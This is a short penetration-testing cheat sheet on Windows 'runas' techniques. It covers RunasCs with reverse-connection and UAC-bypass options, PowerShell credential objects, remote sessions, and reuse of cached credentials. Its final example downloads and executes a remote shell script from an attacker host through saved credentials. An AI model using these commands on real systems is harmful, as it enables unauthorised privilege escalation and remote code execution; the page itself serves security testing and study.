---
title: "Runas"
date: 2024-7-10
tags: ["Powershell", "Credential Object", "Windows", "Runas", "UAC"]
---

### RunasCS

```console
.\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -r <LOCAL_IP>:<LOCAL_PORT>
```

```console
.\RunasCs.exe '<USER>' '<PASSWORD>' "<CMD>" -l <LOGON_TYPE>
```

```console
# Or
.\RunasCs.exe '<USER>' '<PASSWORD>' --bypass-uac "<CMD>" -l <LOGON_TYPE>
```

<br>

```
LOGON TYPE
---------------------
2  Interactive
3  Network
4  Batch
5  Service
7  Unlock
8  NetworkCleartext
9  NewCredentials
10 RemoteInteractive
11 CachedInteractive
```

<small>*Ref: [RunasCS](https://github.com/antonioCoco/RunasCs)*</small>

### Runas (With Password)

```console
runas /user:'<USER>' "<CMD>"
```

```console {class="sample-code"}
runas /user:'admin' "powershell"
```

### Runas (With Cred Object)

#### 1. Create Credential Object

{{< tab set1 tab1 >}}Method 1{{< /tab >}}
{{< tab set1 tab2 >}}Method 2{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = '<PASSWORD>'
```

```console
$secstr = New-Object -TypeName System.Security.SecureString
```

```console
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
```

{{< /tabcontent >}}

#### 2. Run Command

{{< tab set2 tab1 >}}Invoke-Command{{< /tab >}}
{{< tab set2 tab2 >}}PSSession{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
# Set computer to 'localhost' if running locally
Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME>
```

```console {class="sample-code"}
Invoke-Command -ScriptBlock { powershell } -Credential $cred -Computer localhost
```

```console
# If error, try
Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -auth credssp
```

```console
# Invoke command with config
Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -ConfigurationName <CONFIG_NAME>
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
# Set computer to '.' if running locally
new-pssession -computername <COMPUTER_NAME> -credential $cred
```

```console {class="sample-code"}
new-pssession -computername . -credential $cred
```

```console
# Switch to new session
enter-pssession <SESSION_ID>
```

{{< /tabcontent >}}

### Runas (With Cached Creds)

#### 1. Check Cached Creds

```console
cmdkey /list
```

#### 2. Run Command

```console
runas /user:<DOMAIN>\<USER> /savecred "<CMD>"
```

```console {class="sample-code"}
# e.g. Upload and run a shell
runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://<LOCAL_IP>/shell.ps1')"
```
